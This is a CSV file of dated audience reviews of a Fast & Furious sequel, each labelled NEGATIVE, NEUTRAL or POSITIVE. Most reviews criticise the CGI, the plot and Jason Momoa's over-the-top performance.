Date,Score,Reviews
"Apr 13, 2024",NEGATIVE,"Jason Momoa is the only bright spot in this otherwise terrible film. Vin Diesel has driven this franchise into the ground. He has milked it so far beyond when he should have stopped, but I guess as long as the movies keep bringing in $$, he doesn't care how embarrassingly bad they are."
"Apr 11, 2024",NEGATIVE,I've never been so disappointed in a Jason Mamoa performance or a Fast and Furious movie.
"Apr 8, 2024",NEGATIVE,"Rápidos y Furiosos 5: Robaron una caja fuerte.
Rápidos y Furiosos 6: En el aire weon.
Rápidos y Furiosos 7: Saltan con autos entre edificios.
Rápidos y Furiosos 8: Corrieron contra un submarino.
Rápidos y Furiosos 9: Fueron al espacio.
Rápidos y Furiosos 10: ... ?"
"Apr 5, 2024",NEGATIVE,"Watched until I could no longer stomach it. How in the world this movie has a positive audience score is beyond me. Maybe it is a reflection of where moviegoers are, I don't know. This movie is simply ridiculous. Not Starship Troopers ridiculous. Ridiculous ridiculous. The CGI is ridiculous. The fight scenes are beyond ridiculous. The acting.....oh, the acting...ridiculous. That car chase/Raiders of the Lost Ark collection of scenes was extra ridiculous. Anyway, possibly the worst movie ever made. So bad that even The Rise of Skywalker looks Oscar-worthy in comparison."
"Mar 26, 2024",NEGATIVE,Wow Jason Momoa is AWFUL in this movie. Plot was already dumb but his joker style acting was just off putting. Worst movie of the franchise. I did like Reacher in the film he had great presence
"Mar 26, 2024",NEUTRAL,"As a fan of Fast and Furious, this part really disappointed me. A movie about chasers turned into a sci-fi movie that doesn't focus on racing at all. The real F&F ended with part 7. I have nothing more to say, the movie was fun, but not what it should've been."
"Mar 24, 2024",NEUTRAL,"It opens with family and barbecue... and revenge. The Fast & Furious franchise has become very proficient at making big budget, high octane action movies with plots that are clear and coherent. The main fault is that they often get so absurd that it's impossible to take it seriously, but that might be a blessing in disguise because it forces the plot into being kept simple and mostly straight-forward.  This installment mostly follows those patterns... and then it ends and there is no family, there is no barbecue, and the story goes into the void."
"Mar 24, 2024",NEGATIVE,"Irredeemably silly.  Ludicrous GCI, daft plot, puerile characterisation ..... a real low point for the franchise."
"Mar 22, 2024",NEUTRAL,Jason's character saved the movie
"Mar 4, 2024",NEGATIVE,I cannot say that this is good movie or even good entertaiment.
"Mar 4, 2024",NEGATIVE,"This movie was absolutely terrible. Stuff just happens with no explanation whatsoever. The cgi is God awful. The kid is terrible. Jason mamoa's joker esq performance is laughably bad. Such over acting from mamoa. The tough girls kicking ass is just ridiculous. I just couldn't with this movie. Skip it. If this is where there going with this series, miss me."
"Feb 29, 2024",POSITIVE,this move is completely bonkers!!! fantastic!!
